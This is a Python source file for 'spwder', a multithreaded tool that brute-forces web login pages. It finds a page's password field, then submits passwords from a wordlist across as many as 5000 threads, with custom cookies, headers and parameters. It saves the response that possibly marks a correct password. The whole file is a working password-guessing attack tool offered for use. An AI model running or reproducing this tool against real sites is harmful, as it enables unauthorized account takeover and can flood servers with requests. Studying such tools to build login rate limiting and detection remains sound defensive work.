###### spwder v1  Jul 2023  Py 3.10.7
##################### >>>>>>>>>>>>>> Written by imcyber0wl on github
import urllib.request
from html.parser import HTMLParser
import os
import argparse
import sys
from colorama import Fore,Back,Style
import threading
import time

cwd=os.getcwd()
#if dump files not found,create them
try:
    f=open(cwd+"\dump1.txt","r")
    f.close()
except:
    f=open(cwd+"\dump1.txt","w")
    f.close()
try:
    f=open(cwd+"\dump2.txt","r")
    f.close()
except:
    f=open(cwd+"\dump2.txt","w")
    f.close()

print("                   \_______/ ")
print("               `.,-'\_____/`-.,' ")
print("                /`..'\ _ /`.,'\ ")
print("               /  /`.,' `.,'\  \ ")
print("            __/__/__/     \__\__\___")
print("            __ __ __ SPWDER__ __ ___")
print("              \  \  \     /  /  /")
print("               \  \,'`._,'`./  /")
print("                \,'`./___\,'`./")
print("               ,'`-./_____\,-'`.")
print("                   /       \     ")

#art from https://www.asciiart.eu/animals/spiders

inputholder=(0,0,0,0) #gets info on where is the input field
argparser = argparse.ArgumentParser(description="?")

#Files needed in cwd: pwds.txt dump1.txt dump2.txt

# url 
argparser.add_argument('url',
                       metavar='url', type=str, help='URL to login page')

#-dump=1 or -dump=2 with url=x or anything #1 for normal login page response,
#2 for page that possibly indicates correct password
argparser.add_argument('-dump',
                       metavar='dump', type=int, help='Show dumped data')


# pl, path to file containing passwords user wanna try
argparser.add_argument('-pl',
                       metavar='cpwds', type=str, help='Use external passwords file')

# cf for: load cookie from path provided after the argument
argparser.add_argument('-cf',
                       metavar='cookieF', type=str, help='Use custom cookies')

# cc for: use cookie provided in cmd
#example: cc=h27hjs28jdss 
argparser.add_argument('-cc',
                       metavar='cookieC', type=str, help='Use custom cookies')

#no cookies set by user means the app will accept cookies from target and use them

# https=1 for on 
argparser.add_argument('-https',
                       metavar='httpsf', type=int, help='Use HTTPS (HTTP is default)')

#add parameters  
#example: p=email=mymail@gmail.com&username=johndoe
#encode the & only so it works...
argparser.add_argument('-p',
                       metavar='paramf', type=str, help='Add parameters to bruteforce requests')

#add custom headers (this will remove all default headers!)
#make sure to change user agent when choosing to set custom headers
#must load them from file!
#example: -h=path/to/headers.txt
#headers.txt should contain: header-here \n(newline) header value \n(newline)...etc
argparser.add_argument('-hd',
                       metavar='headersf', type=str, help='Set custom headers')


def show_dump(cwd,x):
    dumped=open(cwd+"\dump"+str(x)+".txt","r",encoding='utf-')
    print(dumped.read())
    dumped.close()

try:
    args = argparser.parse_args()
except:
    print(Fore.RED,"Please provide correct arguments")
    sys.exit(0)
    
###############flags:
https_f=0 #for https , default: http
cookie_f=0 #use custom cookie 
param_f=0 #specify parameters to send with bruteforce
headers_f=0 #user specifies headers
passwords_f=0  #user choses passwords file

cookie_='' #where custom cookie is stored
params='' #where custom parameters will be stored
headers_=['',''] #where custom headers are stored X #where values of custom headers are stored

## get arguments 
if args.cf:
    cookie_f=1
    try:
        cookief = open(args.cf,'r')
    except:
        print(Fore.RED,"couldnt open file for cookie ",args.cf)
        sys.exit(0)
    try:
        cookie_=cookief.readline()        ##############consider chanigng mybe?
        cookie_=cookie_[0:len(cookie_)-1]  #strip newline byte
    except:
        print(Fore.RED,"couldnt read from cookie file")
        sys.exit(0)
    cookief.close()
        
if args.cc and args.cf:
    print(Fore.YELLOW,"Will use cookie from file")
    
if args.cc and (not args.cf):
    cookie_=args.cc
    cookie_f=1

if args.p:
    param_f=1
    params=args.p
    if params[0]!="&":
        params="&"+params
    
if args.https:
    if args.https==1:
        https_f=1
    else:
        https_f=0

if args.hd:
    headers_f=1

if args.dump:
    if args.dump==1:
        show_dump(cwd,1)
        sys.exit(0)
    if args.dump==2:
        show_dump(cwd,2)
        sys.exit(0)
    

################### Parser     
class myp(HTMLParser):
    def handle_starttag(self,tag,attr):
        global inputholder

        #if found an input tag
        if tag=="input":
            x=len(attr)-1
            y=0
            ytype=['']*(x+1)
            
            #make a list of the attributes of <input>
            for xtype in attr:
                ytype[y]=attr[y] 
                y+=1

            y=-1
            checkflag=0 #to know if we found its a password
            checkflag2=0 #to know if we know the name yet
            name_value=['']
            
            #iterate through attributes (attribute,value)
            for z in ytype:
                 y+=1
                 f2=ytype[y]
                 f=f2[0]
                 if f=="name":
                     checkflag2=1 #found a name
                     name_value[0]=f2[1] #save the name
                     
                 if f=="type" or f=="value" or f=="name" or f=="id" or f=="placeholder":
                     f=f2[1]
                     if f=="password" or f=="pwd" or f=="pswd" or f=="Password" or f=="PASSWORD" or f=="pass":
                         checkflag=1 #found a password
                     else:
                         pass

                     #if we have found a "name" attribute and we can confirm this tag is for password:
                     if checkflag2==1 and checkflag==1: 
                         inputholder=(tag,'name',name_value[0],1)
                     else:
                         pass
                 else:
                     pass
        else:
            pass


###########PHASE 1: make first request, parse and find the parameter we need

################ Make request function 
#URL and m for Method
def make_req(url,m):
    ###   Add custom parameters
    if param_f==1:
        url=url+params

    #Use HTTPS
    if https_f==1:
        try:
            httpshandler=urllib.request.HTTPSHandler() #create handler
            opener=urllib.request.build_opener(httpshandler) #create opener for https handler
            urllib.request.install_opener(opener) #install it global so urlopen can use i
            url="https://"+url
        except:
            print(Fore.RED,"Couldn't use HTTPS")
            url="http://"+url
    else:
        url="http://"+url


    ### Add custom headers
    if headers_f==1:
        x=0
        ax=1
        req=urllib.request.Request(url,method=m)
        try:
            headersfile=open(args.hd,'r')
            ax=len(headersfile.readlines())/2
            headersfile.close()
            headersfile=open(args.hd,'r')
        except:
            print(Fore.RED,"Couldn't open headers file: ",args.hd)
            print(Fore.GREEN,"Using default headers")
            x="f"
            ax="f"
            req=urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})

        while x!=ax:
            headers_[0]=headersfile.readline()
            headers_[1]=headersfile.readline()
            try:
                #strip newline character from headers
                hdl=len(headers_[0])
                headers_[0]=headers_[0][0:hdl-1]
                hdl=len(headers_[1])
                headers_[1]=headers_[1][0:hdl-1]
                req.add_header(headers_[0],headers_[1])
            except:
                print(Fore.RED,"Couldn't add header ",headers_[0]," to request")
            x+=1

        if x!="f": #to avoid getting error in case opening failed
            headersfile.close()

    else:
        ##Use default
        req=urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})

    ######## Add Custom Cookies
    if cookie_f==1:
        try:
            req.add_header("Cookie",cookie_)
        except:
            print(Fore.RED,"Couldn't add Cookie ",cookie_," to request")

    #cookie handler
    cookie_opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor()) #create opener for https handler
    urllib.request.install_opener(cookie_opener)

    return req

########## Function that dumps data in file dump1.txt or dump2.txt
##cwd, response object, request object, x to know if dump1 or dump2, p is password (str)
def dump_data(cwd,rsp,req,x,p):
    try:
        dumpfile=open(cwd+"\dump"+str(x)+".txt",'w',encoding='utf-8')
    except:
        print(Fore.RED,"error in openning dump file")

    nl='\n'
    if x==1:
        try:
            dumpcontent="Request:"+nl+str(req.host)+nl+str(req.type)+nl+str(req.get_method())+nl+str(req.full_url)+nl+nl+nl+"Response:"+nl+"Code:"+str(rsp.getcode())+nl+"Headers:"+nl+str(rsp.getheaders())+nl+nl+nl+data2feed
            dumpfile.write(str(dumpcontent))
        except:
            print("couldnt write to dump1 file")

    else:
        try:
            dumpcontent=">>>PASSWORD: "+p+nl+nl+"Request:"+nl+str(req.host)+nl+str(req.type)+nl+str(req.get_method())+nl+str(req.full_url)+nl+nl+nl+"Response:"+nl+"Code:"+str(rsp.getcode())+nl+"Headers:"+nl+str(rsp.getheaders())+nl+nl+nl+data2feed
            dumpfile.write(str(dumpcontent))
        except:
            print("couldnt write to dump2 file")        

    dumpfile.close()
    


######## if url doesnt end with "?", append "?" to it
url=args.url    #'stackoverflow.com/users/login'
url_length=len(url)
url=url[4:url_length]
url_length=len(url)
if url[url_length-1]=="?":
    pass
else:
    url=url+"?"

####### Make request    
req=make_req(url,'GET')       


#Send request
try:
    response=urllib.request.urlopen(req)
    print(Fore.GREEN,"Request sent...")
except:
    print(Fore.RED,"An error occured while sending request")
    sys.exit(0)

#Parse response
mypr=myp()
data2feed=str(response.read(),'utf-8')
print("Looking for password fields...")
mypr.feed(data2feed)
if inputholder[3]!=1:
    print("No password fields found.")
    sys.exit(0)
else:
    print(Fore.GREEN,"Found password field:",inputholder)


dump_data(cwd,response,req,1,'')  #dump result of first response


########################### Phase 2: preapre for bruteforce

#### Prepare passwords
global pwdslen #for knowing the number of passwords to test
global looper #used to control main loop in all threads
pwdslen=0
looper=True

#### Check if user specified a custom list of passwords
if args.pl:
    passwords_f=1
    try:
        pwdsfile=open(args.pl,"r")
        allpwds=pwdsfile.readlines()
        pwdslen=len(allpwds)-1
    except:
        print(Fore.RED,"failed to open custom passwords file! using default file.")
        passwords_f=0
        pwdslen=0
        
if passwords_f==0 and pwdslen==0:
    try:
        pwdsfile=open(cwd+"\pwds.txt","r")
        allpwds=pwdsfile.readlines()
        pwdslen=len(allpwds)-1
    except:
        print(Fore.RED,"failed to open passwords file!")
        sys.exit(0)

######### Function to read a password from allpwds 
def getpwd(x):
    global allpwds
    try:
        pswd=allpwds[x]
        return pswd[0:(len(pswd)-1)] #remove newline from returned password
    except:
        print(Fore.RED,"Couldn't get password ",x)
        return 0


########### Function to send request, used for testing passwords
def send_req(password,n,parameter,parser,url):
    global looper
    #password to send, and parameters to add
    req=make_req(url+"&"+parameter+"="+password,'POST') #make request

    #Send request
    try:
        print("Trying password ",n," : ",password)
        response=urllib.request.urlopen(req)
    except urllib.error.HTTPError:
        print(Fore.RED,"An error occured while sending request")
        return True

    #Parse response
    data2feed=str(response.read(),'utf-8')
    parser.feed(data2feed)

    if inputholder[3]!=1:
        looper=False #stop main loop and other threads
        print(Fore.GREEN,Style.BRIGHT,"Possibly found password: ",password)
        #because the page changed for something other than password
        dump_data(cwd,response,req,2,password) #2 because its during bruteforce
        return False #stop the thread's loop

    else:
        pass #password doesnt work
    return True

global threads
############## t=thread number   n=starting point   i=ending point  ihold=input holder (name)  prsr=parser  url=url
def send_req_thread(t,n,i,ihold,prsr,url):
    global threads
    looper_t=True
    global looper
    while looper_t==True and n!=i and looper==True:
        try:
            looper_t=send_req(getpwd(n),n,ihold,prsr,url)#send_req(getpwd(allpwds),inputholder[2],mypr,url) #mypr is a parser object we used earlier
            n+=1
        except:
            print(Fore.RED,"Request failed...")
    #print("Thread ",t," finished.")
    threads-=1  #close thread


### Decide number of threads based on number of passwords
threads2make=100
if pwdslen<500:
    threads2make=10
elif pwdslen>10000 and pwdslen<50000:
    threads2make=500
elif pwdslen>=50000 and pwdslen<1000000:
    threads2make=1000
elif pwdslen>=1000000:
    threads2make=5000

########### give each thread a starting point and how many passwords to test from that point
passwords_to_test=(pwdslen+1)//threads2make #1420//100=14 , 10000//100=100 
remainder=(pwdslen+1)%threads2make
starting_point=0
ending_point=passwords_to_test 
threads=threads2make

print("ending point: ",ending_point)
print("remainder: ",remainder)
time.sleep(3)
while threads2make>0:
    if remainder>0:
        ending_point+=remainder
        remainder=0
        
    if ending_point-1>=pwdslen-1:
        ending_point=pwdslen-1
        threads2make=0

    t=threading.Thread(target=send_req_thread,
                      args=(threads2make,starting_point,ending_point-1,inputholder[2],mypr,url))
    t.start()
    print("Created thread ",threads2make)

    #time.sleep(0.1) #makes nearly 10 threads per second
    threads2make-=1
    starting_point=ending_point
    ending_point+=passwords_to_test

while looper==True and threads>0:
    pass #wait until looper is false, either password found or all passwords failed

if threads<=0:
    print(Fore.YELLOW,"No results. Tried all ",pwdslen+1," available passwords.")
else:
    time.sleep(2) 
    print("><>< stopped ><><")

sys.exit(0)
